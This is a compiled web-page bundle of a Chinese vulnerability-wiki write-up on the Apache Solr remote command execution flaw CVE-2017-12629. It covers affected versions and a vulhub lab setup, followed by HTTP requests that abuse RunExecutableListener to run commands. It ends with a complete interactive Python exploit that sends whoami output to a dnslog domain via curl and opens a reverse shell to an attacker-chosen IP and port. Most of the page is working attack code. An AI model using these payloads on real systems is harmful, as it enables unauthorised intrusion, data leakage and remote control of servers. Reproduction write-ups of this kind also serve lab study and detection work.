import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const c={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r={href:"https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE",target:"_blank",rel:"noopener noreferrer"},d=n("p",null,"参考阅读：",-1),k={href:"https://www.freebuf.com/sectool/159970.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://blog.csdn.net/whatday/article/details/106974271?utm_medium=distribute.pc_relevant.none-task-blog-title-7&spm=1001.2101.3001.4242",target:"_blank",rel:"noopener noreferrer"},v=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr &lt; 7.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>https://github.com/vulhub/vulhub.git
cd vulhub/solr/CVE-2017-12629
docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>先请求url地址获取 core 内容</p>`,6),b={href:"http://xxx.xxx.xxx.xxx:8983/solr/admin/cores",target:"_blank",rel:"noopener noreferrer"},g=p(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091150843.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091150170.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>第一个请求包用于载入缓存中</p><p>exe : ping 执行的命令</p><p>dir: 命令存在的目录位置</p><p>args:命令参数</p><p>如下请求包执行的是 /bin/ping 1.1.1.1</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code>POST /solr/demo/config HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> xxx.xxx.xxx.xxx<span class="token operator">:</span><span class="token number">8983</span>
Connection<span class="token operator">:</span> close
Content-Type<span class="token operator">:</span> application/json  
Content-Length<span class="token operator">:</span> <span class="token number">198</span>

<span class="token punctuation">{</span>
  <span class="token property">&quot;add-listener&quot;</span> <span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">&quot;event&quot;</span><span class="token operator">:</span><span class="token string">&quot;postCommit&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;newlistener-1&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;class&quot;</span><span class="token operator">:</span><span class="token string">&quot;solr.RunExecutableListener&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;exe&quot;</span><span class="token operator">:</span><span class="token string">&quot;ping&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;dir&quot;</span><span class="token operator">:</span><span class="token string">&quot;/bin/&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;args&quot;</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">&quot;1.1.1.1&quot;</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091150685.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>第二个请求包用于更新缓存并执行命令</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code>POST /solr/demo/update HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> xxx.xxx.xxx.xxx<span class="token operator">:</span><span class="token number">8983</span>
Connection<span class="token operator">:</span> close
Content-Type<span class="token operator">:</span> application/json  
Content-Length<span class="token operator">:</span> <span class="token number">198</span>

<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">&quot;id&quot;</span><span class="token operator">:</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091151324.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意 第一个请求包的这个位置 &quot;name&quot;:&quot;newlistener-1&quot;,listerer的名字需要替换</p><p>例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2</p><p>注意 第二个请求包的这个位置 [{&quot;id&quot;:&quot;test&quot;}]，同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2</p><p>注意 Content-Type: application/json 需要添加</p><p>不更改执行发生报错示例</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091151387.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入docker容器查看发现命令已经执行</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091152887.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用 newSearcher可以直接加载入缓存执行命令</p><p>请求包如下</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code>POST /solr/demo/config HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> xxx.xxx.xxx.xxx<span class="token operator">:</span><span class="token number">8983</span>
Connection<span class="token operator">:</span> close
Content-Type<span class="token operator">:</span> application/json  
Content-Length<span class="token operator">:</span> <span class="token number">198</span>

<span class="token punctuation">{</span>
  <span class="token property">&quot;add-listener&quot;</span> <span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">&quot;event&quot;</span><span class="token operator">:</span><span class="token string">&quot;newSearcher&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;newlistener-2&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;class&quot;</span><span class="token operator">:</span><span class="token string">&quot;solr.RunExecutableListener&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;exe&quot;</span><span class="token operator">:</span><span class="token string">&quot;bash&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;dir&quot;</span><span class="token operator">:</span><span class="token string">&quot;/bin/&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;args&quot;</span><span class="token operator">:</span><span class="token punctuation">[</span>
         <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span>
         <span class="token string">&quot;mkdir /tmp/vuln&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意点同上，也需要每次执行更改 &quot;name&quot;:&quot;newlistener-2&quot; 的参数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091152811.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功执行了创建文件的命令</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091152090.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测</p><p>漏洞POC</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment"># author : PeiQi</span>
<span class="token comment"># from   : http://wiki.peiqi.tech</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">import</span> random

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: Apache Solr &lt; 7.1                                        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式: python3 cve-2017-12629.py                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mcmd    &gt;&gt;&gt; dnslog地址(漏洞外连检测)                                  \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mCmd    &gt;&gt;&gt; shell(反弹shell)                                        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    core_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>core_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        core_name <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功获得core_name,Url为：&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/config\\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> core_name
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> dnslog_url<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    exp_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/config&quot;</span>
    dnslog_url <span class="token operator">=</span> <span class="token string">&quot;\`whoami\`.&quot;</span> <span class="token operator">+</span> dnslog_url
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    payload_cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
    {&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newSearche-%s&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;curl&quot;,&quot;dir&quot;:&quot;/usr/bin/&quot;,&quot;args&quot;:[&quot;%s&quot;]}}
    &quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> dnslog_url<span class="token punctuation">)</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>exp_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_cmd<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&quot;add-listener&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功执行，请查看dnslog \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 漏洞利用失败 \\033[0m&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_3</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    exp_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/config&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    payload_cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
        {&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newSearche-%s&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1&quot;]}}
        &quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>exp_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_cmd<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&quot;add-listener&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功执行 \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 漏洞利用失败 \\033[0m&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    core_name <span class="token operator">=</span> POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
        cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mCmd &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">&quot;shell&quot;</span><span class="token punctuation">:</span>
            IP   <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35m请输入监听IP   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            PORT <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35m请输入监听PORT &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            POC_3<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> n<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">:</span>
            dnslog_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;\\033[35m请输入你的dnslog地址：\\033[0m&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> dnslog_url<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091155228.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091155591.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码</p>`,34);function q(x,h){const a=o("ExternalLinkIcon");return i(),l("div",null,[u,n("p",null,[s("Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞："),n("a",r,[s("XML实体扩展漏洞（XXE）"),t(a)]),s("和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。")]),d,n("ul",null,[n("li",null,[n("p",null,[n("a",k,[s("Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测"),t(a)])])]),n("li",null,[n("p",null,[n("a",m,[s("cve-2017-12629 apache solr xxe & rce 漏洞分析"),t(a)])])])]),v,n("p",null,[n("a",b,[s("http://xxx.xxx.xxx.xxx:8983/solr/admin/cores"),t(a)])]),g])}const y=e(c,[["render",q],["__file","Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html.vue"]]);export{y as default};
